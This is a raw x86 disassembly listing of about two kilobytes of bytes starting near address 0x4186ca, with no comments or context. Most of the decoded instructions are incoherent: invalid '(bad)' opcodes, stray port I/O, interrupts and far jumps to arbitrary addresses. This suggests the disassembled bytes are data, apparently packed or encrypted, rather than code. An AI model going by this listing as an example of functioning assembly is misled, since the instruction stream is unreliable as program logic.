  4186ca:	or     dl,BYTE PTR [ebx+0x2b3b07ca]
  4186d0:	lods   eax,DWORD PTR ds:[esi]
  4186d1:	add    DWORD PTR [edi],0x41
  4186d4:	sti    
  4186d5:	jl     0x418689
  4186d7:	jns    0x418682
  4186d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4186da:	mov    dh,0x5a
  4186dc:	or     edi,DWORD PTR [edi-0x73]
  4186df:	sar    BYTE PTR [esi-0x2b],1
  4186e2:	add    al,0xce
  4186e4:	(bad)  
  4186e5:	adc    esp,DWORD PTR [esi+0x54]
  4186e8:	xchg   edx,eax
  4186e9:	sahf   
  4186ea:	pop    ebx
  4186eb:	mov    DWORD PTR ds:0x54cf1eb,edx
  4186f1:	lea    esi,[edx]
  4186f3:	ins    DWORD PTR es:[edi],dx
  4186f4:	pop    esp
  4186f5:	mov    ds:0xdb80beb3,eax
  4186fa:	test   eax,0x98ba9aa4
  4186ff:	jbe    0x418745
  418701:	retf   
  418702:	int    0x64
  418704:	arpl   WORD PTR [ebp+0x4b],bp
  418707:	ins    DWORD PTR es:[edi],dx
  418708:	mov    bl,0x4b
  41870a:	or     edx,DWORD PTR [esi-0x3cff82ef]
  418710:	jge    0x41875a
  418712:	or     al,0x8c
  418714:	das    
  418715:	xchg   esp,eax
  418716:	mov    BYTE PTR [edx],bh
  418718:	frstor [esi]
  41871a:	dec    edx
  41871b:	push   ds
  41871c:	out    0x6f,al
  41871e:	fld    st(5)
  418720:	jmp    0x79c6f034
  418725:	inc    ecx
  418726:	dec    edi
  418727:	lock int 0x7c
  41872a:	ds pop es
  41872c:	jecxz  0x418728
  41872e:	scas   al,BYTE PTR es:[edi]
  41872f:	mov    eax,0x527ebf06
  418734:	sub    eax,0xa9ea54c1
  418739:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41873a:	mov    bh,0x98
  41873c:	pop    edi
  41873d:	fwait
  41873e:	mov    al,ds:0x1ec571b9
  418743:	mov    ebx,0xe5ed80cf
  418748:	and    DWORD PTR [ebp+0x62219dcb],ebp
  41874e:	add    al,ch
  418750:	pop    ecx
  418751:	stos   DWORD PTR es:[edi],eax
  418752:	shr    BYTE PTR [bp+di],0x9
  418756:	shr    BYTE PTR ds:0x6db79a65,1
  41875c:	mov    eax,ds:0x2bb22cd7
  418761:	push   esi
  418762:	add    edx,ecx
  418764:	neg    edi
  418766:	jmp    0x418c78
  41876b:	ret    0xc43e
  41876e:	retf   0xcac4
  418771:	ret    0x85c6
  418774:	aad    0x2e
  418776:	leave  
  418777:	(bad)  
  418778:	and    eax,0xe0254e6f
  41877d:	jg     0x4187f7
  41877f:	jae    0x4187fd
  418781:	js     0x4187fb
  418783:	dec    ebp
  418784:	push   es
  418785:	js     0x418753
  418787:	push   ds
  418788:	mov    ch,BYTE PTR [edx]
  41878a:	jns    0x4187b1
  41878c:	xor    ah,BYTE PTR [edi-0x2b]
  41878f:	jbe    0x418759
  418791:	mul    DWORD PTR [esi-0x3f]
  418794:	mov    bl,0xff
  418796:	lods   eax,DWORD PTR ds:[esi]
  418797:	jmp    0xb2842f98
  41879c:	fst    QWORD PTR [ebx]
  41879e:	sbb    dl,BYTE PTR [eax+0x3f]
  4187a1:	les    ebp,FWORD PTR [ebx-0x68]
  4187a4:	push   esp
  4187a5:	mov    al,ds:0xcf1e2d43
  4187aa:	arpl   sp,ax
  4187ac:	in     al,dx
  4187ad:	xor    BYTE PTR [edx+0x6a],dh
  4187b0:	(bad)  
  4187b1:	rcr    BYTE PTR [edx-0x17],cl
  4187b4:	sub    eax,0x771be9f8
  4187b9:	mov    al,0x73
  4187bb:	adc    al,0x16
  4187bd:	out    0x1c,al
  4187bf:	int    0x88
  4187c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4187c2:	lods   eax,DWORD PTR ds:[esi]
  4187c3:	imul   DWORD PTR [edx+eiz*4-0x2a]
  4187c7:	hlt    
  4187c8:	popa   
  4187c9:	ret    
  4187ca:	test   DWORD PTR [edi-0x5abc0764],edx
  4187d0:	cmp    al,0x1b
  4187d2:	(bad)  
  4187d3:	sbb    eax,0x328c7852
  4187d8:	add    al,0x5f
  4187da:	push   0x77
  4187dc:	rcl    DWORD PTR [ecx-0x40],0x9d
  4187e0:	out    dx,eax
  4187e1:	jno    0x4187bb
  4187e3:	cs push ds
  4187e5:	jae    0x4187a1
  4187e7:	jl     0x4187da
  4187e9:	in     al,0xba
  4187eb:	push   edi
  4187ec:	xor    al,0xde
  4187ee:	jmp    0x4c314ff4
  4187f3:	inc    eax
  4187f4:	sti    
  4187f5:	outs   dx,BYTE PTR ds:[esi]
  4187f6:	sahf   
  4187f7:	push   ss
  4187f8:	inc    eax
  4187f9:	add    ch,BYTE PTR [edi-0x4d9936c9]
  4187ff:	mov    edx,0x4caf117c
  418804:	xor    bl,BYTE PTR [ebx-0x7e]
  418807:	aad    0xf0
  418809:	or     ecx,DWORD PTR [esi-0x75]
  41880c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41880d:	sub    BYTE PTR [eax+0x1d0a1e67],0x10
  418814:	and    cl,BYTE PTR [ecx]
  418816:	push   esi
  418817:	jp     0xbdc81a64
  41881d:	icebp  
  41881e:	std    
  41881f:	pop    ds
  418820:	xlat   BYTE PTR ds:[ebx]
  418821:	jo     0x41882f
  418823:	lahf   
  418824:	dec    edx
  418825:	stos   DWORD PTR es:[edi],eax
  418826:	add    al,0x13
  418828:	retf   
  418829:	fcmovb st,st(2)
  41882b:	retf   0x1bc4
  41882e:	sub    cl,BYTE PTR [ebx+0x6e]
  418831:	clc    
  418832:	pop    esi
  418833:	int3   
  418834:	ss jnp 0x41887b
  418837:	enter  0x44fc,0x94
  41883b:	scas   eax,DWORD PTR es:[edi]
  41883c:	xchg   edx,eax
  41883d:	xchg   ebp,eax
  41883e:	scas   eax,DWORD PTR es:[edi]
  41883f:	jns    0x418851
  418841:	sahf   
  418842:	xchg   ebx,eax
  418843:	and    al,0x6d
  418845:	push   edx
  418846:	or     eax,0xa32f85d9
  41884b:	mov    edx,edx
  41884d:	retf   0xcf48
  418850:	adc    eax,0xa1b5a6da
  418855:	inc    edx
  418856:	icebp  
  418857:	sub    BYTE PTR [edx-0x62],dl
  41885a:	lods   eax,DWORD PTR ds:[esi]
  41885b:	fisub  WORD PTR [esi]
  41885d:	jmp    0x41881f
  41885f:	iret   
  418860:	mov    ds:0xc246c1f2,eax
  418865:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418866:	in     al,dx
  418867:	sbb    eax,0x7c968922
  41886c:	imul   ebx,DWORD PTR [ecx+0x2a9589f6],0xc
  418873:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418874:	xor    BYTE PTR [edx-0x3],0x90
  418878:	mov    dl,0xea
  41887a:	pop    ss
  41887b:	neg    esi
  41887d:	js     0x4188ac
  41887f:	xlat   BYTE PTR ds:[ebx]
  418880:	and    bh,bh
  418882:	inc    edx
  418883:	aas    
  418884:	(bad)  
  418885:	(bad)  
  418886:	retf   
  418887:	xor    DWORD PTR [ecx-0x5a],eax
  41888a:	xor    eax,0xe2d89275
  41888f:	mov    ds:0x99cca31e,al
  418894:	add    eax,0x2af3ba7b
  418899:	mov    ebx,0xfae43401
  41889e:	adc    ebp,DWORD PTR [ecx-0xd]
  4188a1:	adc    BYTE PTR [eax],bh
  4188a3:	rcl    BYTE PTR [ebx+0x7b974fe],0xd5
  4188aa:	adc    ebx,0xc3496f3
  4188b0:	mov    bl,0xd7
  4188b2:	scas   al,BYTE PTR es:[edi]
  4188b3:	sub    BYTE PTR [ecx],0x62
  4188b6:	pop    ebx
  4188b7:	xor    eax,0xa3b0d38d
  4188bc:	and    BYTE PTR [esi+eax*2-0x47d39ffa],al
  4188c3:	lods   al,BYTE PTR ds:[esi]
  4188c4:	aam    0x9d
  4188c6:	push   esp
  4188c7:	jg     0x418902
  4188c9:	inc    ebx
  4188ca:	ja     0x41886c
  4188cc:	jne    0x41893a
  4188ce:	add    ebp,0xc3dec688
  4188d4:	sub    esi,DWORD PTR [ebx-0x312660c4]
  4188da:	aaa    
  4188db:	ss popf 
  4188dd:	push   ebp
  4188de:	jnp    0x418935
  4188e0:	add    bh,BYTE PTR [eax]
  4188e2:	fbld   TBYTE PTR [ecx+edx*1-0x48]
  4188e6:	and    al,0xd8
  4188e8:	call   0x1ef152c
  4188ed:	scas   eax,DWORD PTR es:[edi]
  4188ee:	ret    
  4188ef:	icebp  
  4188f0:	xor    bh,BYTE PTR [eax]
  4188f2:	(bad)  
  4188f4:	mov    ebx,0xa42d0c59
  4188f9:	rcl    DWORD PTR [edx+0x3e],1
  4188fc:	pop    ecx
  4188fd:	or     al,0xf8
  4188ff:	sbb    DWORD PTR [esi+0x3f],esi
  418902:	imul   eax,DWORD PTR [edx-0x12],0x609edb1f
  418909:	aad    0xe4
  41890b:	push   ss
  41890c:	into   
  41890d:	outs   dx,DWORD PTR ds:[esi]
  41890e:	xlat   BYTE PTR ds:[ebx]
  41890f:	adc    eax,0x54003ec9
  418914:	push   ds
  418915:	lods   al,BYTE PTR ds:[esi]
  418916:	xor    edi,esi
  418918:	repnz cmp eax,0x85119316
  41891e:	outs   dx,BYTE PTR cs:[esi]
  418920:	lock std 
  418922:	xchg   ebx,eax
  418923:	int    0xe0
  418925:	mov    ebp,0x5f74af22
  41892a:	pop    ss
  41892b:	mov    ebx,0xf63e70a6
  418930:	imul   ecx,DWORD PTR [ecx+ebp*4-0x12],0x98905af4
  418938:	mov    ecx,0xaa3b5b9
  41893d:	cmp    DWORD PTR [edi+esi*4+0x23],esi
  418941:	dec    esi
  418942:	xlat   BYTE PTR ds:[ebx]
  418943:	jge    0x4189ae
  418945:	es jne 0x418906
  418948:	adc    al,0x75
  41894a:	scas   al,BYTE PTR es:[edi]
  41894b:	rcl    DWORD PTR [edx+0x22],1
  41894e:	xlat   BYTE PTR ds:[ebx]
  41894f:	sbb    eax,0x5e8831e8
  418954:	jnp    0x418988
  418956:	inc    edi
  418957:	stos   DWORD PTR es:[edi],eax
  418958:	xor    DWORD PTR [edx-0x11],0xffffff86
  41895c:	sbb    eax,DWORD PTR [eax]
  41895e:	add    BYTE PTR [eax],0xae
  418961:	dec    ebp
  418962:	stc    
  418963:	pop    es
  418964:	cdq    
  418965:	or     cl,BYTE PTR [ecx+0x1c23c3eb]
  41896b:	sub    al,0x96
  41896d:	inc    edi
  41896e:	shl    ch,0x90
  418971:	cli    
  418972:	test   al,0xf1
  418974:	in     eax,dx
  418975:	loopne 0x41890c
  418977:	or     bh,ah
  418979:	adc    ebp,ebx
  41897b:	ins    BYTE PTR es:[edi],dx
  41897c:	mov    WORD PTR [edx+0x690265ef],es
  418982:	xor    eax,0x1ab92454
  418987:	push   es
  418988:	mov    ch,0xda
  41898a:	mov    ecx,0x75def718
  41898f:	in     al,dx
  418990:	sub    BYTE PTR [edx-0x7b],bh
  418993:	sar    BYTE PTR [ebx+ebp*2],0xa3
  418997:	cld    
  418998:	cli    
  418999:	pop    ds
  41899a:	popf   
  41899b:	fild   QWORD PTR [esp+ebp*4+0x425dd0b8]
  4189a2:	mov    bh,0xa5
  4189a4:	pop    ss
  4189a5:	and    ch,bh
  4189a7:	mov    ss,WORD PTR [eax+0x7f505030]
  4189ad:	add    DWORD PTR ds:0x85c8f2eb,ebp
  4189b3:	or     al,0x22
  4189b5:	jbe    0x4189ec
  4189b7:	cmp    BYTE PTR [esi],dl
  4189b9:	sub    ah,al
  4189bb:	lds    ebp,FWORD PTR [esi-0x1e]
  4189be:	scas   eax,DWORD PTR es:[edi]
  4189bf:	pop    eax
  4189c0:	inc    esp
  4189c1:	mov    al,ds:0x841dd8f3
  4189c6:	outs   dx,BYTE PTR ds:[esi]
  4189c7:	sub    al,0x7a
  4189c9:	adc    BYTE PTR [esi+edx*4-0x66],bl
  4189cd:	push   ebp
  4189ce:	shl    BYTE PTR [edx],0xb0
  4189d1:	mov    ah,0xc9
  4189d3:	aaa    
  4189d4:	jge    0x418958
  4189d6:	repz sti 
  4189d8:	jmp    0xe159:0xe35a4632
  4189df:	jae    0x418a18
  4189e1:	dec    ecx
  4189e2:	pop    ds
  4189e3:	add    ch,dh
  4189e5:	xchg   edx,eax
  4189e6:	or     BYTE PTR [esi+0x75],bl
  4189e9:	mov    al,0x38
  4189eb:	xchg   esp,eax
  4189ec:	daa    
  4189ed:	(bad)  
  4189ee:	lods   al,BYTE PTR ds:[esi]
  4189ef:	adc    ecx,ebx
  4189f1:	std    
  4189f2:	xchg   ch,bl
  4189f4:	and    eax,DWORD PTR ds:[ebx]
  4189f7:	pop    ebp
  4189f8:	call   0xcc048fa9
  4189fd:	std    
  4189fe:	push   ss
  4189ff:	push   es
  418a00:	test   bl,0xd1
  418a03:	loop   0x418a18
  418a05:	add    BYTE PTR ds:0x60af1f5a,dh
  418a0b:	repnz not ch
  418a0e:	xchg   dh,ah
  418a10:	mov    DWORD PTR [edx-0x20],ebp
  418a13:	scas   al,BYTE PTR es:[edi]
  418a14:	imul   edx,esp,0xe5de4679
  418a1a:	push   ebx
  418a1b:	ins    BYTE PTR es:[edi],dx
  418a1c:	mov    es,WORD PTR [ecx]
  418a1e:	adc    ch,BYTE PTR ds:0x5329e562
  418a24:	xchg   esp,eax
  418a25:	cmp    ebx,esi
  418a27:	jp     0x418aa5
  418a29:	mov    ds:0x54ca95ff,eax
  418a2e:	fidivr DWORD PTR [edi-0x78]
  418a31:	sbb    BYTE PTR [eax+edi*1],al
  418a34:	dec    edi
  418a35:	lods   al,BYTE PTR ds:[esi]
  418a36:	(bad)  
  418a37:	xchg   DWORD PTR [ebx+ecx*1-0x48],ebp
  418a3b:	loop   0x418aa1
  418a3d:	mov    ebp,0xd901fef0
  418a42:	xchg   edx,eax
  418a43:	loope  0x4189dd
  418a45:	pop    ecx
  418a46:	adc    eax,0x7ba0411d
  418a4c:	push   ebx
  418a4d:	xchg   ch,dl
  418a4f:	int    0xc0
  418a51:	call   0x1ab3601a
  418a56:	ret    0x3fba
  418a59:	and    al,0x11
  418a5b:	inc    ecx
  418a5c:	fnsave [eax-0x5c]
  418a5f:	fistp  QWORD PTR [eax]
  418a61:	fwait
  418a62:	sar    DWORD PTR [ebx-0x73],1
  418a65:	mov    BYTE PTR [ebp+0x7b4d6440],dl
  418a6b:	inc    edi
  418a6c:	lods   al,BYTE PTR ds:[esi]
  418a6d:	adc    ah,ah
  418a6f:	inc    esi
  418a70:	sub    ebp,DWORD PTR [edi+0x16493f0]
  418a76:	fld    QWORD PTR [edi+0x395c6822]
  418a7c:	pushf  
  418a7d:	xchg   ebx,eax
  418a7e:	adc    eax,DWORD PTR [eax-0x6a336aa9]
  418a84:	mov    eax,DWORD PTR [ebx+0x55bedbb2]
  418a8a:	(bad)
  418a8e:	push   edi
  418a8f:	leave  
  418a90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a91:	bound  eax,QWORD PTR [edi+0x2b649808]
  418a97:	or     DWORD PTR [ecx-0x73b2a231],ebx
  418a9d:	xchg   ecx,eax
  418a9e:	mov    eax,ds:0x39f65ecc
  418aa3:	out    0xec,eax
  418aa5:	inc    esi
  418aa6:	add    al,0x74
  418aa8:	mov    bl,0xb2
  418aaa:	(bad)  
  418aab:	neg    DWORD PTR [eax]
  418aad:	push   ebx
  418aae:	je     0x418a65
  418ab0:	icebp  
  418ab1:	cmp    BYTE PTR [eax],al
  418ab3:	int3   
  418ab4:	xchg   esp,eax
  418ab5:	jns    0x418aad
  418ab7:	mov    al,ds:0x5482bd43
  418abc:	push   0x8c9ce7f3
  418ac1:	imul   ebp,DWORD PTR [edx],0xffffffb5
  418ac4:	arpl   WORD PTR [esi+ecx*4],di
  418ac7:	jecxz  0x418aa8
  418ac9:	xchg   edi,eax
  418aca:	inc    ecx
  418acb:	mov    eax,ds:0x77ce0a66
  418ad0:	mov    gs,WORD PTR [edi+0x4c772274]
  418ad6:	neg    eax
  418ad8:	adc    bl,BYTE PTR [eax]
  418ada:	push   0x795d560e
  418adf:	enter  0x694f,0x38
  418ae3:	or     bh,BYTE PTR [ebx-0x560e6293]
  418ae9:	imul   esp,DWORD PTR [ebx+0x46],0x3f
  418aed:	mov    esp,DWORD PTR [esi-0x2f70ba83]
  418af3:	xchg   BYTE PTR [esi-0x18],al
  418af6:	push   ebx
  418af7:	stos   BYTE PTR es:[edi],al
  418af8:	and    edx,ebp
  418afa:	je     0x418b04
  418afc:	ret    0x65
  418aff:	adc    DWORD PTR [edx+0x3cce506a],ebx
  418b05:	int    0x2
  418b07:	xchg   ebx,eax
  418b08:	out    0xf6,eax
  418b0a:	ror    DWORD PTR [eax+0x2e],cl
  418b0d:	mov    gs,WORD PTR [ebp-0x550902f0]
  418b13:	fisttp QWORD PTR ds:0x8bf804fe
  418b19:	cmp    DWORD PTR ds:0x3111891a,ecx
  418b1f:	sub    edi,ebx
  418b21:	mov    al,cl
  418b23:	jnp    0x418ab3
  418b25:	jmp    0x7edfdfcc
  418b2a:	jno    0x418b30
  418b2c:	in     eax,0xcd
  418b2e:	inc    edx
  418b2f:	shl    esp,1
  418b31:	cmp    ah,BYTE PTR [ebx+0x33]
  418b34:	sar    ebp,0xee
  418b37:	retf   
  418b38:	pushf  
  418b39:	pop    es
  418b3a:	mov    bl,0x90
  418b3c:	sbb    eax,DWORD PTR [edi]
  418b3e:	xchg   edi,eax
  418b3f:	pushf  
  418b40:	xchg   esp,eax
  418b41:	mov    cl,0xc6
  418b43:	mov    WORD PTR [ebx+ebx*1],ds
  418b46:	ss fld st(6)
  418b49:	outs   dx,DWORD PTR ds:[esi]
  418b4a:	lea    ebx,[ecx+0x5c]
  418b4d:	pop    ecx
  418b4e:	mov    cl,0xbf
  418b50:	outs   dx,BYTE PTR ds:[esi]
  418b51:	lds    ebx,FWORD PTR [ebp+ecx*4-0x6f11420]
  418b58:	cld    
  418b59:	shl    BYTE PTR [edi],1
  418b5b:	xchg   edx,eax
  418b5c:	and    DWORD PTR ds:[eax+0x4a702673],0xfffffffd
  418b64:	aam    0xd0
  418b66:	dec    edi
  418b67:	sub    eax,0x660e4814
  418b6c:	push   esi
  418b6d:	xor    al,0xc0
  418b6f:	sar    BYTE PTR ds:0x86217252,cl
  418b75:	imul   esp,DWORD PTR [ecx],0x34b3e0ad
  418b7b:	imul   esp,eax,0xffffffdd
  418b7e:	aad    0xcb
  418b80:	xlat   BYTE PTR ds:[ebx]
  418b81:	ret    0xc6e3
  418b84:	jmp    0xe4a3:0x466ac74f
  418b8b:	fbstp  TBYTE PTR [edi]
  418b8d:	aas    
  418b8e:	mov    eax,ds:0x476a56fc
  418b93:	das    
  418b94:	fistp  DWORD PTR [eax]
  418b96:	(bad)  
  418b97:	cmp    al,0xe5
  418b99:	sbb    dh,ah
  418b9b:	dec    DWORD PTR [ecx-0x26b6ccb]
  418ba1:	fucomip st,st(2)
  418ba3:	xor    eax,0xd1c22d9c
  418ba8:	xchg   ebx,eax
  418ba9:	add    bl,al
  418bab:	sahf   
  418bac:	mov    ch,0xf6
  418bae:	sub    edx,ebx
  418bb0:	push   ss
  418bb1:	dec    esi
  418bb2:	mov    eax,ds:0x5bf3fddf
  418bb7:	mov    ebx,0x2ae20202
  418bbc:	jge    0x418b74
  418bbe:	mov    bl,0x19
  418bc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418bc1:	repz aam 0x2c
  418bc4:	icebp  
  418bc5:	xor    bh,BYTE PTR [ebp-0xdea9cc9]
  418bcb:	lds    edx,FWORD PTR [ecx+0x28338d89]
  418bd1:	(bad)  
  418bd2:	stos   BYTE PTR es:[edi],al
  418bd3:	pop    ebp
  418bd4:	test   al,0xd6
  418bd6:	rcr    DWORD PTR [ebp+0x13106d48],cl
  418bdc:	sub    ch,bl
  418bde:	and    al,0x79
  418be0:	(bad)  
  418be2:	test   eax,0x44333958
  418be7:	push   ds
  418be8:	or     al,0x97
  418bea:	fisttp QWORD PTR [eax+0x71]
  418bed:	dec    ebp
  418bee:	outs   dx,DWORD PTR ds:[esi]
  418bef:	mov    eax,ds:0xa1c9d7ee
  418bf4:	pop    esp
  418bf5:	(bad)  
  418bf6:	sbb    al,0x69
  418bf8:	pop    edx
  418bf9:	jmpw   0x5ea
  418bfd:	mov    ebp,0x40de51e1
  418c02:	mov    ds:0xc5948509,al
  418c07:	inc    eax
  418c08:	sar    DWORD PTR [ebx+edi*8-0x6ba9bf8e],cl
  418c0f:	data16 sub ah,bl
  418c12:	pop    ecx
  418c13:	xchg   BYTE PTR [ecx+0x2b55258f],bl
  418c19:	scas   al,BYTE PTR es:[edi]
  418c1a:	jle    0x418c04
  418c1c:	jge    0x418c69
  418c1e:	fcomp  QWORD PTR [edx+esi*8-0x5dba0e33]
  418c25:	adc    al,0x2
  418c27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c28:	inc    ebx
  418c29:	repz inc ebp
  418c2b:	int3   
  418c2c:	xchg   edx,eax
  418c2d:	jmp    0x4761:0xc3478e8d
  418c34:	mov    bh,0x30
  418c36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c37:	inc    eax
  418c38:	sub    BYTE PTR [esi-0x615b01c2],dl
  418c3e:	jmp    0xa713:0x5bb51117
  418c45:	scas   al,BYTE PTR es:[edi]
  418c46:	xlat   BYTE PTR ds:[ebx]
  418c47:	adc    al,0xe1
  418c49:	xor    ebx,ebp
  418c4b:	sti    
  418c4c:	arpl   WORD PTR [esi+0x5f],dx
  418c4f:	sar    BYTE PTR [esi],0xf6
  418c52:	jg     0x418c22
  418c54:	fiadd  DWORD PTR [edx]
  418c56:	daa    
  418c57:	inc    ebp
  418c58:	lahf   
  418c59:	fcom   DWORD PTR [eax]
  418c5b:	jnp    0x418c71
  418c5d:	(bad)  
  418c5e:	int    0xda
  418c60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c61:	das    
  418c62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c63:	mov    al,ds:0xaac63776
  418c68:	xorps  xmm2,XMMWORD PTR [ebx]
  418c6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c6c:	out    dx,al
  418c6d:	pop    edx
  418c6e:	imul   esp,DWORD PTR gs:[ecx-0x4f],0x22
  418c73:	popf   
  418c74:	fmul   QWORD PTR ss:[ebx]
  418c77:	push   0x90c5589
  418c7c:	sbb    eax,0x42a3b5
  418c81:	jmp    0x419193
  418c86:	int    0x3d
  418c88:	cmp    eax,0xd5d7cdd7
  418c8d:	(bad)
  418c90:	not    al
  418c92:	push   edi
  418c93:	int3   
  418c94:	test   DWORD PTR [edx+0x787feb18],ebp
  418c9a:	jae    0x418d18
  418c9c:	js     0x418d16
  418c9e:	push   ss
  418c9f:	mov    DWORD PTR [ebp+eax*8-0x44],edi
  418ca3:	jb     0x418c5e
  418ca5:	enter  0x8366,0x25
  418ca9:	push   0xc5fbc193
  418cae:	and    eax,0x5ab8ab4f
  418cb3:	xchg   BYTE PTR [edi+ecx*2],ch
  418cb6:	lods   eax,DWORD PTR ds:[esi]
  418cb7:	in     al,0x22
  418cb9:	xor    DWORD PTR cs:[eax-0x20aefec4],ebx
  418cc0:	jmp    0xabe0:0xcc35255e
  418cc7:	stc    
  418cc8:	push   0x823229f6
  418ccd:	shl    BYTE PTR [esi],cl
  418ccf:	pop    edi
  418cd0:	rol    BYTE PTR [ecx+0x10],1
  418cd3:	mov    ebx,0xcf5ecda7
  418cd8:	cwde   
  418cd9:	mov    eax,0x4056ea7d
  418cde:	pop    esi
  418cdf:	sub    DWORD PTR [edi-0x52],edx
  418ce2:	cmp    al,0x8c
  418ce4:	pop    es
  418ce5:	jg     0x418d1e
  418ce7:	mov    ds:0x1e38c14f,eax
  418cec:	dec    esp
  418ced:	arpl   dx,bp
  418cef:	push   edi
  418cf0:	push   0xe131c715
  418cf5:	mov    cl,BYTE PTR [ebp+0x114993af]
  418cfb:	mov    dl,0x2b
  418cfd:	or     al,0xbf
  418cff:	jb     0x418c98
  418d01:	jl     0x418d37
  418d03:	sbb    cl,BYTE PTR [esi-0x6f]
  418d06:	jge    0x418d4c
  418d08:	test   BYTE PTR [edx*8+0x6cac9568],0xfb
  418d10:	mul    DWORD PTR [ebp-0x61c98ce8]
  418d16:	inc    edx
  418d17:	in     al,dx
  418d18:	repnz mov ds:0x3c0572c7,al
  418d1e:	mov    ebp,0x842e85c5
  418d23:	xchg   edi,eax
  418d24:	lods   al,BYTE PTR ds:[esi]
  418d25:	push   eax
  418d26:	xchg   esp,eax
  418d27:	fdiv   QWORD PTR [esi]
  418d29:	sub    al,BYTE PTR [ebp-0x5a]
  418d2c:	test   eax,0x53cafb24
  418d31:	and    eax,0x7c51a9f8
  418d36:	jmp    0x6da910d8
  418d3b:	ins    DWORD PTR es:[edi],dx
  418d3c:	adc    cl,al
  418d3e:	iret   
  418d3f:	adc    ah,BYTE PTR [ecx]
  418d41:	xchg   ebx,eax
  418d42:	mov    bl,0x43
  418d44:	sbb    al,0xaf
  418d46:	mov    al,0x6f
  418d48:	dec    esp
  418d49:	or     al,0x10
  418d4b:	xlat   BYTE PTR ds:[ebx]
  418d4c:	sub    ah,dh
  418d4e:	(bad)  
  418d4f:	push   eax
  418d50:	jp     0x418ce6
  418d52:	fisttp DWORD PTR [ecx+eiz*1-0x11]
  418d56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d57:	fnsave [edx-0x173015ec]
  418d5d:	mov    ds,WORD PTR [ecx]
  418d5f:	popf   
  418d60:	cmp    eax,0x1255ee02
  418d65:	inc    eax
  418d66:	mov    eax,0x90ea6438
  418d6b:	or     eax,0xf38a7114
  418d70:	xor    eax,0x46e93f0
  418d75:	mov    eax,ds:0xf970dd34
  418d7a:	and    BYTE PTR [esi],al
  418d7c:	cmp    BYTE PTR [esp+edx*1+0xd],bl
  418d80:	shl    DWORD PTR [ecx+0x6be1e94c],cl
  418d86:	aam    0x7a
  418d88:	pushf  
  418d89:	and    ch,BYTE PTR [edi]
  418d8b:	xchg   DWORD PTR [edi],ecx
  418d8d:	jge    0x418d69
  418d8f:	jae    0x418d44
  418d91:	jne    0x418d7f
  418d93:	inc    edi
  418d94:	push   ebx
  418d95:	xlat   BYTE PTR ds:[ebx]
  418d96:	mov    ebx,0x767770cf
  418d9b:	int    0xbb
  418d9d:	jb     0x418e04
  418d9f:	mov    ds:0xe4d556c9,al
  418da4:	ins    DWORD PTR es:[edi],dx
  418da5:	adc    BYTE PTR [edi+0x411f3a14],dh
  418dab:	scas   eax,DWORD PTR es:[edi]
  418dac:	loop   0x418dad
  418dae:	(bad)  
  418daf:	lds    edx,FWORD PTR [ebx]
  418db1:	fstp   TBYTE PTR [esi+edx*4]
  418db4:	fld    DWORD PTR [esi+edx*2-0x1a37f382]
  418dbb:	rol    DWORD PTR [edx-0x20aa1ea6],cl
  418dc1:	mov    WORD PTR [ebp-0x7d4289b7],?
  418dc7:	push   es
  418dc8:	sbb    dh,BYTE PTR [edx+0x52e31da8]
  418dce:	xchg   edi,eax
  418dcf:	fsub   QWORD PTR [eax-0x7e104931]
  418dd5:	ret    
  418dd6:	(bad)  
  418dd7:	sbb    eax,0xdc363fd1
  418ddc:	mov    ebp,0x18d8ed79
  418de1:	fidivr DWORD PTR [esi+0x3c]
  418de4:	pop    esi
  418de5:	xchg   ebp,eax
  418de6:	cmp    DWORD PTR [ebp-0x2ec611e9],edx
  418dec:	xor    BYTE PTR [ebx-0x15],bh
  418def:	adc    al,0xb1
  418df1:	sub    al,0x57
  418df3:	sbb    eax,DWORD PTR [ebp+0x75]
  418df6:	(bad)  
  418df7:	test   al,0xf0
  418df9:	sbb    eax,0x4c59863c
  418dfe:	cwde   
  418dff:	cld    
  418e00:	or     bl,bl
  418e02:	rol    bl,1
  418e04:	iret   
  418e05:	es fwait
  418e07:	or     al,BYTE PTR [esi+0x4bb028bc]
  418e0d:	loope  0x418e07
  418e0f:	sbb    edx,DWORD PTR [ebx]
  418e11:	xchg   esp,eax
  418e12:	mov    ebp,eax
  418e14:	jno    0x418e87
  418e16:	xchg   ah,ah
  418e18:	addr16 inc edi
  418e1a:	dec    edx
  418e1b:	pop    ebp
  418e1c:	scas   eax,DWORD PTR es:[edi]
  418e1d:	and    BYTE PTR es:[ebp-0x4a35deb6],bh
  418e24:	xchg   ebx,eax
  418e25:	cmp    bh,0xff
  418e28:	(bad)  
  418e29:	imul   esp,ecx,0xffffffee
  418e2c:	jbe    0x418e0d
  418e2e:	push   0xbd3ea795
  418e33:	fadd   DWORD PTR [ecx+0x7c]
  418e36:	push   ss
  418e37:	scas   eax,DWORD PTR es:[edi]
  418e38:	in     al,dx
  418e39:	cs push esp
  418e3b:	add    DWORD PTR [esi+ecx*1],esp
  418e3e:	or     esp,0xffffff8a
  418e41:	fcom   QWORD PTR [esi]
  418e43:	(bad)  
  418e44:	dec    ebx
  418e45:	ret    
  418e46:	imul   ebx,esi,0x84805495
  418e4c:	sbb    al,0x9c
  418e4e:	jno    0x418e52
  418e50:	adc    BYTE PTR [eax],bl
  418e52:	aas    
  418e53:	sub    DWORD PTR [esp+edx*1],ecx
  418e56:	dec    esi
  418e57:	mov    cl,0xa7
  418e59:	adc    ebx,ebp
  418e5b:	adc    dh,BYTE PTR [edx+0x72856e22]
  418e61:	cld    
  418e62:	jnp    0x418ed1
  418e64:	add    ebp,DWORD PTR [esi]
  418e66:	bound  esp,QWORD PTR [edi-0x56]
  418e69:	and    cl,BYTE PTR [eax-0xb01fdd9]
  418e6f:	sar    BYTE PTR ds:0xfbc49878,cl
  418e75:	stc    
  418e76:	dec    edx
